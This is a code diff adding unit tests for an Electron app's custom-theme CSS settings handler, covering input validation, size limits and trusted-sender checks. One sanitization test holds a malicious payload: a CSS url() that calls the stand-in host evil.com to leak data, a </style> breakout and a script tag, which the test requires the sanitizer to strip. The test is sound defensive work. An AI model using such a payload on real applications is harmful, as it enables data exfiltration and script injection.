@@ -33,6 +33,7 @@ vi.mock('../main-context', () => ({
 }));
 
 const { registerSettingsIpc } = await import('./settings-ipc');
+const { setTrustedSenderId } = await import('./trusted-sender');
 
 // ---------------------------------------------------------------------------
 // Fixtures
@@ -48,6 +49,7 @@ function makeMockDeps(): MainContext {
     settings: {
       setAppPath: vi.fn().mockResolvedValue(undefined),
       setAppPort: vi.fn().mockResolvedValue(undefined),
+      setCustomThemeCss: vi.fn().mockResolvedValue(undefined),
     },
     core: {
       status: vi.fn().mockResolvedValue({ apps: [], platform: 'win32' }),
@@ -65,6 +67,7 @@ describe('settings-ipc parameter validation', () => {
   beforeEach(() => {
     handlers.clear();
     vi.clearAllMocks();
+    setTrustedSenderId(1);
     mockDeps = makeMockDeps();
     registerSettingsIpc(mockDeps);
   });
@@ -125,6 +128,54 @@ describe('settings-ipc parameter validation', () => {
       await expect(handler({}, 'workbuddy', null)).resolves.toBeDefined();
       expect(vi.mocked(mockDeps.settings.setAppPort)).toHaveBeenCalledWith('workbuddy', null);
       expect(notifyStatusChanged).toHaveBeenCalled();
+    });
+  });
+
+  describe('SETTINGS_SET_CUSTOM_CSS', () => {
+    const trustedEvent = { sender: { id: 1 }, senderFrame: { isMainFrame: () => true } };
+
+    it('rejects non-string input', async () => {
+      const handler = handlers.get(IpcChannel.SETTINGS_SET_CUSTOM_CSS)!;
+      await expect(handler(trustedEvent, { not: 'css' })).rejects.toThrow(
+        getMainMessages().invalidCustomCss,
+      );
+      expect(mockDeps.settings.setCustomThemeCss).not.toHaveBeenCalled();
+    });
+
+    it('rejects input over the 256KB limit', async () => {
+      const handler = handlers.get(IpcChannel.SETTINGS_SET_CUSTOM_CSS)!;
+      await expect(handler(trustedEvent, 'x'.repeat(256 * 1024 + 1))).rejects.toThrow(
+        getMainMessages().invalidCustomCss,
+      );
+      expect(mockDeps.settings.setCustomThemeCss).not.toHaveBeenCalled();
+    });
+
+    it('sanitizes a malicious payload before persisting (C2)', async () => {
+      const handler = handlers.get(IpcChannel.SETTINGS_SET_CUSTOM_CSS)!;
+      const malicious =
+        'body{background:url(https://evil.com/?leak=1)}</style><script>alert(1)</script>';
+      await handler(trustedEvent, malicious);
+      const persisted = vi.mocked(mockDeps.settings.setCustomThemeCss).mock.lastCall?.[0] as string;
+      // The `</style>` breakout and the script tag must be gone.
+      expect(persisted).not.toContain('</style>');
+      expect(persisted).not.toContain('<script');
+      // The remote url() resource MUST NOT survive sanitization.
+      expect(persisted).not.toContain('url(https://evil.com');
+    });
+
+    it('persists clean CSS unchanged', async () => {
+      const handler = handlers.get(IpcChannel.SETTINGS_SET_CUSTOM_CSS)!;
+      const safe = 'body { color: #fff; background: #222; }';
+      await handler(trustedEvent, safe);
+      expect(vi.mocked(mockDeps.settings.setCustomThemeCss)).toHaveBeenCalledWith(safe);
+    });
+
+    it('rejects calls from an untrusted sender (G5)', async () => {
+      const handler = handlers.get(IpcChannel.SETTINGS_SET_CUSTOM_CSS)!;
+      await expect(handler({ sender: { id: 999 } }, 'body{}')).rejects.toThrow(
+        'Untrusted IPC sender',
+      );
+      expect(mockDeps.settings.setCustomThemeCss).not.toHaveBeenCalled();
     });
   });
 });
